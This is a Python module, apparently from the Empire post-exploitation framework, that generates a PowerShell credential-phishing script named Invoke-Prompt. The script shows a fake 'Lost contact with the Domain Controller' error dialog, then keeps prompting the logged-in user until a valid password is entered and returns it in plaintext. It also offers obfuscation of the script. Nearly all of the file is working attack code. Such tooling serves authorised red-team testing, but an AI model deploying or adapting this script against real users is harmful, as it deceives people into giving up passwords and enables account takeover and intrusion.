from lib.common import helpers
class Module:
    def __init__(self, mainMenu, params=[]):
        self.info = {
            'Name': 'Invoke-Prompt',
            'Author': ['greg.fossk', '@harmj0y', '@enigma0x3'],
            'Description': ("Prompts the current user to enter their credentials "
                            "in a forms box and returns the results."),
            'Background' : False,
            'OutputExtension' : None,
            'NeedsAdmin' : False,
            'OpsecSafe' : False,
            'Language' : 'powershell',
            'MinLanguageVersion' : '2',
            'Comments': [
                'http://blog.logrhythm.com/security/do-you-trust-your-computer/'
                'https://enigma0x3.wordpress.com/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/'
            ]
        }
        self.options = {
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'MsgText' : {
                'Description'   :   'Message text to display if not waiting for a process create.',
                'Required'      :   True,
                'Value'         :   'Lost contact with the Domain Controller.'
            },
            'IconType' : {
                'Description'   :   'Critical, Question, Exclamation, or Information',
                'Required'      :   True,
                'Value'         :   'Critical'
            },
            'Title' : {
                'Description'   :   'Title of the message box to display if not waiting for a process create.',
                'Required'      :   True,
                'Value'         :   'ERROR - 0xA801B720'
            }
        }
        self.mainMenu = mainMenu
        for param in params:
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value
    def generate(self, obfuscate=False, obfuscationCommand=""):
        script = """
function Invoke-Prompt {
    [CmdletBinding()]
    Param (
        [Switch] $ProcCreateWait,
        [String] $MsgText = 'Lost contact with the Domain Controller.',
        [String] $IconType = 'Critical',
        [String] $Title = 'ERROR - 0xA801B720'
    )
    Add-Type -AssemblyName Microsoft.VisualBasic
    Add-Type -assemblyname System.DirectoryServices.AccountManagement
    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
    if($MsgText -and $($MsgText -ne '')){
        $null = [Microsoft.VisualBasic.Interaction]::MsgBox($MsgText, "OKOnly,MsgBoxSetForeground,SystemModal,$IconType", $Title)
    }
    $c=[System.Security.Principal.WindowsIdentity]::GetCurrent().name
    $credential = $host.ui.PromptForCredential("Credentials Required", "Please enter your user name and password.", $c, "NetBiosUserName")
    if($credential){
           while($DS.ValidateCredentials($c, $credential.GetNetworkCredential().password) -ne $True){
              $credential = $Host.ui.PromptForCredential("Windows Security", "Invalid Credentials, Please try again", "$env:userdomain\$env:username","")
          }
        "[+] Prompted credentials: -> " + $c + ":" + $credential.GetNetworkCredential().password
    }
    else{
        "[!] User closed credential prompt"
    }
}
Invoke-Prompt """
        for option,values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        script += " -" + str(option)
                    else:
                        script += " -" + str(option) + " \"" + str(values['Value'].strip("\"")) + "\""
        if obfuscate:
            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
        return script